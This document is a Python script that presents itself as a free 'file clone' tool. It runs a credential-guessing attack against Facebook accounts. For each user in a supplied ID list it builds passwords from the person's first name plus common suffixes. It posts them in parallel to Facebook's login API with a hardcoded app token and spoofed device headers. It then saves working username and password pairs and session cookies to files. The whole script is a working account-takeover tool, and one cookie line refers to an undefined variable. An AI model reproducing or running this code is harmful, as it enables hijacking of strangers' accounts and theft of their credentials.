#_________________{[  WRITER  ]}_______________#
#NAME = Aricoco
#GIT  = ANONYMOUS-CYBER-444
#TEAM = DEVIL MAY CRY™444
#NUMBER = 08036484182
#NOTE = CODE TEACH US HOW TO FIGHT WAR AGAINST SYSTEM

#_________________{[  IMPORT  ]}_______________#
import os, sys, re, time, requests, calendar, random, bs4, uuid, json, subprocess
from concurrent.futures import ThreadPoolExecutor
from requests.exceptions import ConnectionError
#_________________{[  COLOR  ]}_______________#
P = '\x1b[1;97m' # 
M = '\x1b[1;91m' # 
H = '\x1b[1;92m' # 
K = '\x1b[1;93m' # 
N = '\x1b[0m'    # 
#_________________{[  UA  ]}_______________#
ugen = []
for t in range(10000):
	a=random.choice(['3','4','5','6','7','8','9','10','11','12','13'])
	b=random.choice(['OPM1','TP1A','RP1A','PPR1','PKQ1','QP1A','SP1A','RKQ1'])
	c=random.randrange(111111,210000)
	d=random.randrange(73,100)
	e=random.randrange(4200,4900)
	f=random.randrange(40,150)
	random1=random.choice(['SM-J730F','SM-A405FN','SM-J610FN','SM-X11O','SM-Q130A'])
	flame1=f'Mozilla/5.0 (Linux; Android {a}; {random1} Build/{b}.{c}.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{d}.0.{e}.{f} Mobile Safari/537.36'
	flame2=f'Mozilla/5.0 (Linux; Android {a}; {random1} Build/{b}.{c}.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{d}.0.{e}.{f} Mobile Safari/537.36 OPR/60.0.2254.59405'
	uaku2 = random.choice([flame1,flame2])
	ugen.append(uaku2)
     
class crackfile:
      
      def __init__(self):
            self.loop,self.ugen,self.ok,self.cp,self.id1,self.id2 = 0,[],[],[],[],[]
            self.ses = requests.Session()
            self.file()
            
      def Fx(self):
            if "linux" in sys.platform.lower():
                  try:os.system('clear')
                  except:pass
                  
      def api(self,username,passz):
            haha = str(random.choice([M, K, H]))
            sys.stdout.write(f"\r{haha}[ DMC ] {P}{self.loop}|{len(self.id2)} {H}{len(self.ok)} {P}| {K}{len(self.cp)}{N}");sys.stdout.flush()
            for password in passz:
                  try:
                        ua=random.choice(ugen)
                        flame = "[FBAN/FB4A;FBAV/307.0.0.53.7;FBBV/354336875;FBDM/{density=2.0,width=720,height=1384};FBLC/en_GB;FBRV/0;FBCR/AIRTEL;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.orca;FBDV/SM-G930F;FBSV/6.0;FBOP/12;FBCA/armeabi-v7a:armeabi;]"
                        head = {'Host':'graph.facebook.com','x-fb-connection-bandwidth': repr(random.randint(2e7, 3e7)), 'x-fb-sim-hni': repr(random.randint(2e4, 4e4)), 'x-fb-net-hni': repr(random.randint(2e4, 4e4)),'x-fb-connection-quality': 'EXCELLENT','user-agent': flame,'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
                        date = {'access_token': '200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16',  'format': 'JSON', 'sdk_version': {random.randrange(2, 31)}, 'email': username, 'locale': 'en_GB', 'password': password, 'sdk': 'android', 'generate_session_cookies': '1', 'sig': f'{random.randrange(1, 9)}f{random.randrange(100, 999)}f{random.randrange(10, 99)}fb{random.randrange(10, 99)}fcd{random.randrange(1, 9)}aa{random.randrange(0, 9)}c{random.randrange(10, 99)}f{random.randrange(10, 99)}f{random.randrange(100, 999)}ef{random.randrange(1, 9)}'}   
                        flx = self.ses.post("https://graph.facebook.com/auth/login", params=date, headers=head, allow_redirects=False).json()
                        if "session_key" in flx: 
                              coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                              print(f'\r{H}[OK] {username} | {password} | {coki}')
                             
                              open('/sdcard/ok.txt','a').write(f'{username}|{password}\n')
                              self.ok.append(username)
                              break
                        elif "www.facebook.com" in flx["error"]["message"]:
                              print(f'\r{K}[CP] {username} | {password}')
                              open('/sdcard/cp.txt','a').write(f'{username}|{password}\n')
                              self.cp.append(username)
                              break
                        elif "Calls to this api have exceeded the rate limit. (613)" in flx:sys.stdout.write(f"\r{M}[SPAM] {P}{self.loop}|{len(self.id2)} {H}OK : {len(self.ok)} {K}CP : {len(self.cp)}");sys.stdout.flush()
                        else:continue	
                  except requests.exceptions.ConnectionError: time.sleep(35)
            self.loop+=1
            
      def listpw(self):
            self.intel()
            with ThreadPoolExecutor(max_workers=30) as flame:
                  for idf in self.id2:
                        uid,user = idf.split('|')[0], idf.split('|')[1].lower()
                        haha = user.split(' ')[0]
                        if len(user) <=5:
                               if len(haha) <=1 or len(haha) <=2:pass 
                               else:
                                     pwd=[
                                         '57273200',
                                         haha+'123', 
                                         haha+'1234', 
                                         haha+'@@@###', 
                                         haha+'#####', 
                                         haha+'@@##', 
                                         haha+'@#@#', 
                                         haha+'$$$', 
                                         haha+'@', 
                                         haha+'@123', 
                                         haha+'@@', 
                                         haha+'@@@', 
                                         haha+'@@@@', 
                                         haha+'@#', 
                                         haha+'12345', 
                                         haha+'123456',
                                         haha+'01',haha+'02',
                                         haha+'03',haha+'04',
                                         haha+'05',haha+'06',
                                         haha+'07',haha+'08',
                                         haha+'09',haha+'10'
                                    ]
                        else:
                              pwd=[
                                  user, 
                                  '57273200',
                                  haha+'123', 
                                  haha+'1234', 
                                  haha+'@@@###', 
                                  haha+'#####', 
                                  haha+'@@##', 
                                  haha+'@#@#',
                                  haha+'$$$', 
                                  haha+'@', 
                                  haha+'@123', 
                                  haha+'@@', 
                                  haha+'@@@', 
                                  haha+'@@@@', 
                                  haha+'@#', 
                                  haha+'12345', 
                                  haha+'123456',
                                  haha+'01',haha+'02',
                                  haha+'03',haha+'04',
                                  haha+'05',haha+'06',
                                  haha+'07',haha+'08',
                                  haha+'09',haha+'10'
                             ]
                        flame.submit(self.api,uid,pwd)
            exit('\n<>  ')
            
      def file(self):
            self.Fx()
#_________________{[  LOGO  ]}_______________#
            print(f""" 
8888888b.  888b     d888  .d8888b.  
888  "Y88b 8888b   d8888 d88P  Y88b 
888    888 88888b.d88888 888    888 
888    888 888Y88888P888 888        
888    888 888 Y888P 888 888        
888    888 888  Y8P  888 888    888 
888  .d88P 888   "   888 Y88b  d88P 
8888888P"  888       888  "Y8888P" 
____________________________________________________ 
                                
[~] AUTHOR  : Aricoco
[~] GITHUB  : NOT_FOUND
[~] SYSTEM  : DATA & WIFI 
[~] FACEBOOK  : HUSSEIN KIJANA 
[~] TOOL  : FILE CLONE
[~] STATUS  : FREE 
___________________________________________________   {H} DMC {P}
                                    """)
            print(f'{N}______________FREE FOR EVERYONE_____________________')
            file = input(f'{P}[{H}?{P}] YOUR FILE LOCATION : {N}')
            try:
                 for line in open(file, 'r').readlines():
                       self.id1.append(line.strip())
            except IOError:
                  exit(f'{N}[{M}×{N}] ERROR!')
            for ih in self.id1:
                  self.id2.insert(0, ih)
            self.listpw()
            
      def intel(self):
            print(f'{N}____________________________\nCLONE STARTED ON APN MODE EVERY MINUTES')   
            print(f'{N}___________________________________________________')
            
crackfile()
